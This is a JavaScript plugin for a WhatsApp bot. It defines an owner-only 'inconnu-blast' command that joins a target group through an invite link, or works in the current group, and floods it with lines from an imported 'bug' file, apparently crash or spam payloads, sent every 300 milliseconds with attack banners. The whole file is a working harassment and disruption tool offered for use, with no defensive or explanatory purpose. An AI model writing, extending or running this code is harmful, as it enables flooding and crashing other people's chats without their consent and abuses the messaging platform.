import bugchat from '../../bug/inconnu3.js';
import config from '../../config.cjs';

const blastAttack = async (m, Matrix) => {
  const prefix = config.PREFIX;
  const cmd = m.body.startsWith(prefix)
    ? m.body.slice(prefix.length).trim().split(' ')[0].toLowerCase()
    : '';

  if (cmd !== 'inconnu-blast') return;

  const botNumber = await Matrix.decodeJid(Matrix.user.id);
  const senderId = m.sender;
  const isSudo = [botNumber, config.OWNER_NUMBER + '@s.whatsapp.net', ...(config.SUDO || []).map(n => n + '@s.whatsapp.net')].includes(senderId);

  if (!isSudo) {
    return await Matrix.sendMessage(m.from, { text: "*📛 THIS IS AN OWNER COMMAND*" }, { quoted: m });
  }

  const args = m.body.split(' ').slice(1);
  const isGroupLink = args[0]?.startsWith('https://chat.whatsapp.com/');
  const attackLines = bugchat.split('\n').filter(Boolean);

  // Cas 1: Le dev envoie un lien dans un DM
  if (!m.isGroup && isGroupLink) {
    const inviteCode = args[0].split('/')[3];
    try {
      const groupId = await Matrix.groupAcceptInvite(inviteCode);
      await Matrix.sendMessage(senderId, { text: `✅ Joined group via invite.\n🚀 Attacking ${groupId}...` }, { quoted: m });

      for (let line of attackLines) {
        await Matrix.sendMessage(groupId, {
          text: `💥 ${line}\n_INCONNU-XD V2 STRIKE_`,
        });
        await new Promise(r => setTimeout(r, 300));
      }

      await Matrix.sendMessage(senderId, { text: `✅ *INCONNU-BLAST* completed on group.` }, { quoted: m });

    } catch (e) {
      return await Matrix.sendMessage(senderId, { text: "❌ Failed to join group. Link invalid or restricted." }, { quoted: m });
    }

    return;
  }

  // Cas 2: Utilisé directement dans un groupe
  if (m.isGroup) {
    await Matrix.sendMessage(m.from, {
      text: `🚨 *INCONNU-BLAST LAUNCHED*\n🧨 Target: ${m.from}\n💬 Messages: ${attackLines.length}`,
    }, { quoted: m });

    for (let line of attackLines) {
      await Matrix.sendMessage(m.from, {
        text: `⚠️ ${line}\n_BY INCONNU BOY 🦋_`,
      });
      await new Promise(r => setTimeout(r, 300));
    }

    await Matrix.sendMessage(m.from, {
      text: `✅ *INCONNU-BLAST COMPLETE*\n🔥 Target group affected.`,
    }, { quoted: m });

    return;
  }

  // Cas 3: ni groupe ni lien fourni
  await Matrix.sendMessage(m.from, {
    text: `❌ Usage :\n.inconnu-blast https://chat.whatsapp.com/xxxxx (from DM)\n.inconnu-blast (from group)`,
  }, { quoted: m });
};

export default blastAttack;
        
